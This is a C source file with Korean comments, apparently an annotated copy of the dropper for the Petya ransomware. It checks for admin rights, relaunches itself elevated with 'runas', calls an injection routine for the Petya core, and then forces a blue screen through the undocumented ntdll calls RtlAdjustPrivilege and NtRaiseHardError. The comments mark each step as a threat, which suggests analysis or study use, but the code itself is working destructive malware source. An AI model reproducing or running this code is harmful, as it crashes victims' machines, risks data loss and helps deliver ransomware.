#include <Windows.h>
#include "misc.h"

#include <stdio.h>
#include <time.h>

// [IsElevated 함수]
// 현재 프로세스가 관리자 권한(Elevated Privileges)을 가지고 있는지 확인하는 함수
// 관리자 권한이 필요한 작업(파일 시스템 변경, BSOD 트리거 등)을 실행하기 전 확인.
// 위협: 관리자 권한이 있는 경우, 시스템 전반에 걸쳐 악성 코드를 실행할 수 있음.
BOOL 
IsElevated()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if ( OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken ) )
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof( TOKEN_ELEVATION );
		if ( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
			fRet = Elevation.TokenIsElevated;

	}
	if ( hToken )
		CloseHandle( hToken );

	return fRet;
}

// [TriggerBSOD 함수]
// 블루스크린(BSOD)을 강제로 발생시키는 함수
// BSOD는 시스템 복구를 어렵게 만들고 혼란을 야기.
// 위협: BSOD 발생 후 시스템을 비정상적으로 종료하여 데이터를 손상시킬 가능성이 있음.
VOID
TriggerBSOD()
{
	HMODULE ntdll = LoadLibraryA( "ntdll" );
	FARPROC RtlAdjustPrivilege = GetProcAddress( ntdll, "RtlAdjustPrivilege" );
	FARPROC NtRaiseHardError = GetProcAddress( ntdll, "NtRaiseHardError" );

	if ( RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL )
	{
		BOOLEAN tmp1; DWORD tmp2;
		// RtlAdjustPrivilege: 디버그 특권 활성화 (권한 상승)
		( ( VOID( * )( DWORD, DWORD, BOOLEAN, LPBYTE ) )RtlAdjustPrivilege )( 19, 1, 0, &tmp1 );
		// NtRaiseHardError: 블루스크린을 유발하는 강제 오류 트리거
		( ( VOID( * )( DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD ) )NtRaiseHardError )( 0xc0000350, 0, 0, 0, 6, &tmp2 );
	}
}

// [UACElevation 함수]
// 사용자 계정 컨트롤(UAC)을 우회하여 관리자 권한을 얻는 함수
// 관리자 권한이 없으면 현재 실행 파일을 관리자 권한으로 다시 실행.
// 위협: UAC 우회를 통해 사용자 확인 없이 시스템 수준 권한을 확보.
BOOL
UACElevation()
{
	CHAR Path[ 1024 ];
	GetModuleFileName( 0, Path, 1024 ); // 현재 실행 중인 프로세스 경로를 가져옴.

	if ( !IsElevated() )
	{
		// 관리자 권한 실행 시도
		SHELLEXECUTEINFO ShellInfo;
		memset( &ShellInfo, 0, sizeof( SHELLEXECUTEINFOA ) );

		ShellInfo.cbSize = sizeof( SHELLEXECUTEINFOA );
		ShellInfo.lpFile = Path;  // 현재 실행 파일 경로
		ShellInfo.lpVerb = "runas"; // 관리자 권한 실행

		if ( !ShellExecuteEx( &ShellInfo ) )
			return FALSE; // 관리자 권한 실행 실패
	}
	else
		return TRUE; // 이미 관리자 권한 상태
	
}

// [WinMain 함수]
// 프로그램의 진입점. Dropper의 주요 로직이 여기에 포함됨.
// 1. UAC 우회 시도
// 2. Petya 멀웨어 코어를 주입
// 3. BSOD를 트리거하여 시스템 종료
DWORD
WINAPI
WinMain()
{
	// 관리자 권한 확보
	if ( UACElevation() )
	{
		InjectPetyaCore(); // Petya의 코어 악성 코드 주입
		Sleep( 500 ); // 짧은 대기 시간
		TriggerBSOD(); // 시스템을 BSOD로 종료
	}
	else
		ExitProcess( 0 ); // 관리자 권한 획득 실패 시 종료

	return TRUE;
}
